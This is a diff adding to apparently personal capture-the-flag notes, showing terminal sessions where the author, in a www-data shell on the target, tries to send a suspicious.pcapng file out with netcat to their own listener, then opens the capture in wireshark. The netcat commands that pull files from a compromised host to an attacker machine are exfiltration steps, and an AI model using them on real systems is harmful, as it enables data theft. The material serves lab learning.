@@ -541,3 +541,36 @@ drwxr-xr-x 25 root     root      4096 Feb 12 17:32 ..
 > [!note]
 > Think im losing my head but tried to capture this .pcapng file and cant get it?
 
+```
+www-data@startup:/incidents$ ls
+ls
+suspicious.pcapng
+www-data@startup:/incidents$ nc 10.67.86.193 suspicious.pcapng
+nc 10.67.86.193 suspicious.pcapng
+nc: port number invalid: suspicious.pcapng
+www-data@startup:/incidents$ nc 10.67.86.193 4444 suspicious.pcapng
+nc 10.67.86.193 4444 suspicious.pcapng
+nc: getaddrinfo: Servname not supported for ai_socktype
+www-data@startup:/incidents$ 
+```
+
+```
+root@ip-10-67-86-193:~# nc -lnvp 4444 > sus.pcap
+Listening on 0.0.0.0 4444
+Connection received on 10.67.132.67 55036
+^C
+root@ip-10-67-86-193:~# ls
+burp.json      notice.txt                    Rooms
+CTFBuilder     php-reverse-shell-1.0         Scripts
+Desktop        php-reverse-shell-1.0.tar.gz  snap
+Downloads      php-reverse-shell2.php        sus.pcap
+hydra.restore  php-reverse-shell3.php        test.php
+important.png  php-reverse-shell.php         test.txt
+Instructions   Pictures                      thinclient_drives
+linpeas.sh     Postman                       Tools
+root@ip-10-67-86-193:~# wireshark sus.pcap 
+```
+
+> [!note]
+> First code block is what is setup using NetCat to extract file and on Attack machine code block, i setup nc listener and had it redirect to local file and now going to use wireshark to investigate.
+
